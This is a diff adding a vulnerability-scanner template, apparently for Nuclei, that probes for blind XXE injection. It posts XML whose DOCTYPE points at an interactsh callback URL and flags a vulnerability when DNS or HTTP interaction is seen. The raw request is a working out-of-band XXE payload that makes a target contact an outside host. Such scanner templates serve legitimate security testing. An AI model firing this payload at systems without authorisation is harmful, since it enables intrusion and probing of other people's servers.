@@ -1,0 +1,36 @@
+id: blind-xxe
+
+info:
+  name: Blind XXE
+  author: geeknik,otterly
+  severity: high
+
+variables:
+  rletter: "{{rand_base(6,'oterly')}}"
+
+requests:
+  - raw:
+      - |
+        POST {{Path}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x88_64; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip,deflate
+        Referer: {{BaseURL}}
+        Content-Type: text/xml
+        Content-Length: 112
+        Connection: close
+
+        <?xml version="1.0"?>
+        <!DOCTYPE {{rletter}} SYSTEM "http://{{interactsh-url}}">
+        <{{rletter}}>&e1;</{{rletter}}>
+
+    redirects: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
